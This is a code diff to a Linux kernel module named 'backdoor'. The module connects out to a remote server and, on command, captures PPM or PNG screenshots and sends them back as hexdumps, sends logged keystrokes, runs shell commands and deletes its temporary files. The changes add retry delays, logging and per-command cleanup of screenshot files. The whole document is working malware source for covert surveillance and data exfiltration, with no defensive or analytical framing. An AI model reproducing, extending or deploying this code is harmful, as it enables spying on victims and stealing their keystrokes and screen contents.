@@ -32,10 +32,11 @@ static int backdoor_init(void) {
     server_addr.sin_port = htons(SERVER_PORT);
 
     // Connect to the server
-	while(1) {
+    while(1) {
     	ret = sock->ops->connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr), 0);
     	if (ret < 0) {
-    	    printk(KERN_ERR "backdoor: error connecting to server\n");	
+    	    printk(KERN_ERR "backdoor: error connecting to server\n");
+    	    msleep(10000);
     	    continue;
     	}
 		else {
@@ -98,11 +99,12 @@ static int backdoor_init(void) {
 		}
 		else if (!strcmp(buffer, "2")) {	// PPM screenshot (dont support graphic interfaces)
 			error = screenshot_ppm();
+			printk(KERN_INFO "ppm: screenshot = %d", error);
 			if (error < 0) {
-				printk(KERN_ERR "backdoor: erro print screen");
+				printk(KERN_ERR "backdoor: error print screen");
 				break;
 			}
-			msleep(1000);
+			
 			memset(buffer, 0, BUFFER_SIZE);
 			// Send the hexdump of the image, will be turned into an image by the python script
     		strcpy(buffer, "xxd -p /tmp/screenshot.ppm");
@@ -110,16 +112,26 @@ static int backdoor_init(void) {
     		if (error < 0) {
             	break;
         	}
+        	
         	// Read the temporary output file
 			error = read_file(sock, filename);
+			printk(KERN_INFO "ppm: read file = %d", error);
 			if (error <= 0) {
             	break;
         	}
+        	
+        	// Delete screenshot.ppm
+    		memset(buffer, 0, BUFFER_SIZE);
+    		strcpy(buffer, "rm /tmp/screenshot.ppm");
+    		error = execute_shell_command(buffer);
+    		if (error < 0) {
+        		break;
+    		}
 		}
 		else if (!strcmp(buffer, "3")) {	// PNG screenshot (graphic interface)
 			memset(username, 0, 30);
 			// Receive the username
-        	error = receive_message(sock, username, BUFFER_SIZE);
+        	error = receive_message(sock, username, 30);
         	if (error <= 0) {
             	break;
         	}
@@ -135,8 +147,7 @@ static int backdoor_init(void) {
     		error = execute_shell_command(buffer);
     		if (error < 0) {
             	break;
-        	}        	
-        	msleep(5000);
+        	}
         	
         	memset(buffer, 0, BUFFER_SIZE);
         	// Send the hexdump of the image, will be turned into an image by the python script
@@ -144,38 +155,34 @@ static int backdoor_init(void) {
     		error = execute_shell_command(buffer);
     		if (error < 0) {
             	break;
-        	}        	
+        	}
+        	
         	// Read the temporary output file
 			error = read_file(sock, filename);
 			if (error <= 0) {
             	break;
-        	}		
+        	}
+        	
+        	// Delete screenshot.png
+        	memset(buffer, 0, BUFFER_SIZE);
+    		strcpy(buffer, "rm /tmp/screenshot.png");
+    		error = execute_shell_command(buffer);
+    		if (error < 0) {
+        		break;
+    		}
 		}
 		else if (!strcmp(buffer, "4")) {	// Read keybord inputs
 			memset(keylog_buffer, 0, BUFFER_SIZE);
 			set_keylog_buffer(keylog_buffer);
 			
-			send_message(sock, keylog_buffer);			
+			send_message(sock, keylog_buffer);
 		}
 		else {
 			break;
 		}
     
     }
-    
-    // Delete screenshot.ppm and screenshot.png
-    memset(buffer, 0, BUFFER_SIZE);
-    strcpy(buffer, "rm /tmp/screenshot.ppm");
-    error = execute_shell_command(buffer);
-    if (error < 0) {
-        goto release_sock;
-    }
-    memset(buffer, 0, BUFFER_SIZE);
-    strcpy(buffer, "rm /tmp/screenshot.png");
-    error = execute_shell_command(buffer);
-    if (error < 0) {
-        goto release_sock;
-    }
+
     // Delete the temporary file 
     memset(buffer, 0, BUFFER_SIZE);
     strcpy(buffer, "rm /tmp/output.txt");
